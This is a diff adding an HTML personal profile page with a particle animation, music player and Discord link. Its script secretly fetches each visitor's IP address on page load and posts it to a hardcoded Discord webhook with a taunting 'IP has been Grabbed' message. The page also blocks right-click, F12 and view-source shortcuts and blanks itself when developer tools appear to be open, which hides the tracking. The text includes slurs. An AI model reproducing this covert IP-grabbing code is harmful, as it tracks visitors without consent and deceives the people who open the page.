@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>@zen.wrld</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+     background-image: url('smoke.gif');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      background-repeat: no-repeat;
+      font-family: 'Inter', sans-serif;
+      color: #fff;
+      text-align: center;
+      margin: 0;
+      padding: 40px 20px;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: radial-gradient(ellipse at center, rgba(92, 92, 92, 0.05), transparent 70%);
+      z-index: 0;
+      pointer-events: none;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      position: relative;
+      z-index: 10;
+    }
+    .profile-img img {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      border: 2px solid #979797;
+      box-shadow: none;
+      margin-bottom: 20px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .profile-img img:hover {
+      transform: scale(1.1) rotate(10deg); 
+      box-shadow: 0 0 10px #ffffff, 0 0 20px #ffffff, 0 0 40px #141414;
+      cursor: pointer;
+    }
+    .name {
+      font-size: 2.5rem;
+      font-weight: 800;
+      margin-bottom: 10px;
+      background: linear-gradient(45deg, #000000, #ffffff, #000000, #fdfdfd);
+      background-size: 400%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: gradientShift 5s ease infinite;
+    }
+    @keyframes gradientShift {
+      0% { background-position: 0%; }
+      100% { background-position: 400%; }
+    }
+    .subtext {
+      font-size: 1.2rem;
+      margin-bottom: 5px;
+      color: #ccc;
+      overflow: hidden;
+      white-space: nowrap;
+      border-right: 2px solid #ccc;
+      width: 130px;
+      animation: typing 2s steps(11) forwards, blink 0.5s step-end infinite;
+    }
+    @keyframes typing {
+      0% { width: 0; }
+      100% { width: 130px; }
+    }
+    @keyframes blink {
+      0%, 100% { border-color: transparent; }
+      50% { border-color: #ccc; }
+    }
+    .role {
+      font-size: 1rem;
+      color: #aaa;
+      margin-bottom: 20px;
+    }
+    .socials {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      z-index: 20;
+    }
+    .socials img {
+      width: 32px;
+      height: 32px;
+      filter: brightness(0) invert(1);
+      transition: transform 0.3s ease;
+    }
+    .socials img:hover {
+      transform: scale(1.2);
+      filter: brightness(0) invert(1) drop-shadow(0 0 6px #faf7fa);
+    }
+    .message-area {
+      margin-top: 20px;
+      background: #000;
+      border: 2px dashed #fff;
+      padding: 10px;
+      width: 300px;
+      height: 200px;
+      overflow-y: auto;
+      color: #000000;
+    }
+    #message-container div {
+      margin: 5px 0;
+    }
+    input[type="text"] {
+      margin-top: 10px;
+      padding: 5px;
+      font-size: 1rem;
+      background: #000;
+      border: 2px solid rgb(254, 255, 255);
+      color: #fff;
+    }
+    canvas#particle-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 2;
+      pointer-events: none;
+      background: transparent;
+    }
+    .audio-player-glass {
+      width: 350px;
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(30px);
+      border-radius: 20px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      box-shadow: 0 4px 24px rgba(255, 255, 255, 0.1);
+      color: white;
+      margin-top: 25px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: all 0.3s ease;
+    }
+    .album {
+      width: 64px;
+      height: 64px;
+      border-radius: 12px;
+      object-fit: cover;
+      box-shadow: 0 0 8px rgba(255,255,255,0.2);
+    }
+    .track-info {
+      flex: 1;
+      overflow: hidden;
+    }
+    .track-info .title {
+      margin: 0;
+      font-size: 1.1rem;
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .track-info .artist {
+      margin: 0;
+      font-size: 0.85rem;
+      color: #ccc;
+    }
+    .audio-controls {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 5px;
+    }
+    #play-btn, #next-btn, #prev-btn {
+      background: none;
+      border: none;
+      font-size: 1.2rem;
+      color: white;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+    #play-btn:hover, #next-btn:hover, #prev-btn:hover {
+      transform: scale(1.15);
+    }
+    #seek {
+      width: 120px;
+      background: transparent;
+      accent-color: #ffffff;
+      height: 4px;
+      border-radius: 8px;
+      outline: none;
+    }
+    #seek::-webkit-slider-thumb {
+      background: white;
+      border: none;
+      border-radius: 50%;
+      height: 12px;
+      width: 12px;
+      cursor: pointer;
+      margin-top: -4px;
+    }
+    #time {
+      font-size: 0.75rem;
+      color: #ccc;
+    }
+    /* Overlay for blocking content when dev tools are detected */
+    #blocker {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.9);
+      color: #fff;
+      font-size: 2rem;
+      text-align: center;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="particle-canvas"></canvas>
+  <div class="container">
+    <div class="profile-img">
+      <img src="zen.png" alt="zencute">
+    </div>
+    <h1 class="name">zen</h1>
+    <p class="subtext">fuck snitch</p>
+    <p class="role">mahal na mahal ko si anghel</p>
+    <div class="socials">
+      <a href="https://discord.gg/Yf4gkR7TJN"><img src="https://www.svgrepo.com/show/353655/discord-icon.svg" alt="Discord"></a>
+    </div>
+    <div class="audio-player-glass">
+      <img class="album" id="albumArt" src="" alt="Album Art">
+      <div class="track-info">
+        <h4 class="title" id="trackTitle"></h4>
+        <p class="artist" id="trackArtist"></p>
+      </div>
+      <div class="audio-controls">
+        <div>
+          <button id="prev-btn">⏮</button>
+          <button id="play-btn">▶</button>
+          <button id="next-btn">⏭</button>
+        </div>
+        <input type="range" id="seek" value="0" min="0" max="100">
+        <span id="time">0:00 / 0:00</span>
+      </div>
+    </div>
+  </div>
+
+  <audio id="audio"></audio>
+  <div id="ip" style="display: none;"></div>
+  <div id="blocker">Please close developer tools to continue.</div>
+
+  <script>
+    // Particle animation script
+    window.addEventListener('DOMContentLoaded', () => {
+      const canvas = document.getElementById('particle-canvas');
+      if (!canvas) {
+        console.error('Canvas element not found');
+        return;
+      }
+      const ctx = canvas.getContext('2d');
+      if (!ctx) {
+        console.error('Failed to get 2D context');
+        return;
+      }
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      const particles = [];
+
+      class Particle {
+        constructor() {
+          this.x = Math.random() * canvas.width;
+          this.y = Math.random() * canvas.height;
+          this.size = Math.random() * 6 + 3;
+          this.speedY = Math.random() * 1.2 + 0.4;
+          this.baseOpacity = Math.random() * 0.3 + 0.5;
+        }
+        update() {
+          this.y += this.speedY;
+          if (this.y > canvas.height + this.size) {
+            this.y = -this.size;
+            this.x = Math.random() * canvas.width;
+          }
+        }
+        draw() {
+          ctx.globalAlpha = Math.max(this.baseOpacity * (1 - this.y / canvas.height), 0);
+          ctx.shadowBlur = 10;
+          ctx.shadowColor = '#ffffff';
+          ctx.beginPath();
+          ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
+          ctx.fillStyle = 'rgba(255, 255, 255, 1)';
+          ctx.fill();
+          ctx.shadowBlur = 0;
+          ctx.globalAlpha = 1.0;
+        }
+      }
+
+      function initParticles() {
+        for (let i = 0; i < 200; i++) {
+          particles.push(new Particle());
+        }
+        console.log('Initialized 200 particles');
+      }
+
+      function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(particle => {
+          particle.update();
+          particle.draw();
+        });
+        requestAnimationFrame(animateParticles);
+      }
+
+      initParticles();
+      animateParticles();
+      console.log('Particle animation started');
+
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        initParticles();
+        console.log('Canvas resized and particles reinitialized');
+      });
+    });
+
+    // Audio player script
+    const audio = document.getElementById('audio');
+    const playBtn = document.getElementById('play-btn');
+    const nextBtn = document.getElementById('next-btn');
+    const prevBtn = document.getElementById('prev-btn');
+    const seek = document.getElementById('seek');
+    const time = document.getElementById('time');
+    const trackTitle = document.getElementById('trackTitle');
+    const trackArtist = document.getElementById('trackArtist');
+    const albumArt = document.getElementById('albumArt');
+
+    const playlist = [
+      {
+        title: 'YA DIG?',
+        artist: 'HEV ABI',
+        src: 'yed.mp3',
+        cover: 'yadig.png'
+      },
+      {
+        title: 'Champagne',
+        artist: 'CKYG & PARIS',
+        src: 'https://file.garden/aINw_bGAwSNQpu_a/CK%20YG%20-%20Champagne%20feat.%20PARIS.%20(Official%20Lyric%20Video).mp3',
+        cover: 'https://file.garden/aINw_bGAwSNQpu_a/paris.png'
+      },
+      {
+        title: 'Marlboro Black 2',
+        artist: 'Because',
+        src: 'https://file.garden/aINw_bGAwSNQpu_a/Because%20-%20Marlboro%20Black%202%20(Official%20Lyrics%20Video).mp3',
+        cover: 'https://file.garden/aINw_bGAwSNQpu_a/GRA.png'
+      }
+    ];
+
+    let currentTrack = 0;
+
+    function loadTrack(index) {
+      const track = playlist[index];
+      audio.src = track.src;
+      trackTitle.textContent = track.title;
+      trackArtist.textContent = track.artist;
+      albumArt.src = track.cover;
+    }
+
+    playBtn.addEventListener('click', () => {
+      if (audio.paused) {
+        audio.play();
+        playBtn.textContent = '⏸';
+      } else {
+        audio.pause();
+        playBtn.textContent = '▶';
+      }
+    });
+
+    nextBtn.addEventListener('click', () => {
+      currentTrack = (currentTrack + 1) % playlist.length;
+      loadTrack(currentTrack);
+      audio.play();
+      playBtn.textContent = '⏸';
+    });
+
+    prevBtn.addEventListener('click', () => {
+      currentTrack = (currentTrack - 1 + playlist.length) % playlist.length;
+      loadTrack(currentTrack);
+      audio.play();
+      playBtn.textContent = '⏸';
+    });
+
+    audio.addEventListener('timeupdate', () => {
+      const progress = (audio.currentTime / audio.duration) * 100;
+      seek.value = progress;
+      time.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
+    });
+
+    seek.addEventListener('input', () => {
+      audio.currentTime = (seek.value / 100) * audio.duration;
+    });
+
+    function formatTime(sec) {
+      const mins = Math.floor(sec / 60);
+      const secs = Math.floor(sec % 60);
+      return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+    }
+
+    loadTrack(currentTrack);
+
+    function getIP() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('ip').innerHTML = 'Your IP Address is: ' + data.ip;
+          sendWebhook(data.ip);
+        })
+        .catch(error => console.error(error));
+    }
+
+    function sendWebhook(ip) {
+      const webhookURL = 'https://discord.com/api/webhooks/1431275511115681985/DfIUJ0xKbeRH5nb0J5l5cytxvIuFjKNycq1S2XNdYr5ehR_P9Ng6zjTZ5-X0Z5SR1YEA';
+      const payload = {
+    content: `**Ayo nigga your IP has been Grabbed:** ${ip}`,
+    embeds: [{
+      title: "most hated loves you < // 3",
+      description: "~~no snitching~~ ***</3***",
+      image: {
+        url: "https://media.discordapp.net/attachments/1434925871071756348/1434950024508477671/11993ED0-165D-483A-8699-2A13A18CF76C.png?ex=690e2559&is=690cd3d9&hm=f43ebef99709f927efbd8782e3e2b44f4fb3076f7e9ae722f6150094cdde3d22&=&format=webp&quality=lossless&width=1064&height=709"
+      }
+    }]
+  };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => console.log('Webhook sent successfully'))
+      .catch(error => console.error(error));
+    }
+
+    window.addEventListener('load', getIP);
+
+
+    document.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'F12') {
+        e.preventDefault();
+      }
+      if (
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        e.preventDefault();
+      }
+    });
+
+    function detectDevTools() {
+      const threshold = 160;
+      const isDevToolsOpen = () => {
+        return (
+          window.outerWidth - window.innerWidth > threshold ||
+          window.outerHeight - window.innerHeight > threshold ||
+          window.console !== console 
+        );
+      };
+
+      setInterval(() => {
+        if (isDevToolsOpen()) {
+          document.getElementById('blocker').style.display = 'flex';
+          document.body.style.overflow = 'hidden'; 
+        } else {
+          document.getElementById('blocker').style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }
+      }, 1000);
+    }
+
+    detectDevTools();
+  </script>
+</body>
+</html>
